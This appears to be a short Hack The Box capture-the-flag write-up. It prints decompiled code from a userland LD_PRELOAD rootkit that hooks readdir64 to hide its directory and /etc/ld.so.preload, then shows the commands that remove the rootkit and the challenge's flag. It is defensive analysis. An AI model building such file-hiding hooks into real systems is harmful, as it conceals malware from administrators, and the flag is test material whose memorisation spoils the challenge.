'''
dirent64 * readdir64(DIR *__dirp)

{
  int iVar1;
  dirent64 *pdVar2;

  if (orig_readdir64 == (code *)0x0) {
    orig_readdir64 = (code *)dlsym(0xffffffffffffffff,"readdir64");
  }
  do {
    pdVar2 = (dirent64 *)(*orig_readdir64)(__dirp);
    if (pdVar2 == (dirent64 *)0x0) {
      return (dirent64 *)0x0;
    }
    iVar1 = strcmp(pdVar2->d_name,"pr3l04d_");
  } while ((iVar1 == 0) || (iVar1 = strcmp(pdVar2->d_name,"ld.so.preload"), iVar1 == 0));
  return pdVar2;
}


cat /etc/ld.so.preload
/lib/x86_64-linux-gnu/libc.hook.so.6

echo '' > /etc/ld.so.preload

ldconfig

find / -name "pr3l04d_*"
/var/pr3l04d_

cd /var/pr3l04d_
ls
flag.txt

cat flag.txt
HTB{Us3rL4nd_R00tK1t_R3m0v3dd!}

'''
